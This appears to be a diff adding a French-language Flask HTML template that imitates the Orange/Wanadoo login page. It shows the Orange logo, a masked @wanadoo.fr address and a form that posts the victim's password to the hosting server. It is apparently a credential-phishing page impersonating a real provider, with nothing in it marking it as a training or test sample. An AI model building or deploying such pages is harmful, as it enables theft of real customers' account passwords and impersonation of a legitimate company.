@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Connexion - Orange</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <!-- Inclusion des icônes Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="{{ url_for('static', filename='logo-orange.png') }}" alt="Logo Orange" class="logo">
+            <h1>Bienvenue</h1>
+            <div class="email-display">
+                <i class="fa fa-user"></i>
+                <span>************@wanadoo.fr</span>
+            </div>
+            <form method="post">
+                <label for="password">Saisissez votre mot de passe</label>
+                <div class="password-wrapper">
+                    <input type="password" name="password" id="password" required>
+                    <i class="fa fa-eye eye-icon"></i>
+                </div>
+                <button type="submit">S’identifier</button>
+            </form>
+            <div class="forgot">
+                <a href="#">Mot de passe oublié ? <i class="fa fa-angle-right orange-arrow"></i></a>
+            </div>
+        </div>
+    </div>
+    <script>
+        // Script pour afficher/masquer le mot de passe
+        const eyeIcon = document.querySelector('.eye-icon');
+        const passwordInput = document.querySelector('#password');
+
+        eyeIcon.addEventListener('click', () => {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            eyeIcon.classList.toggle('fa-eye-slash');
+        });
+    </script>
+</body>
+</html>
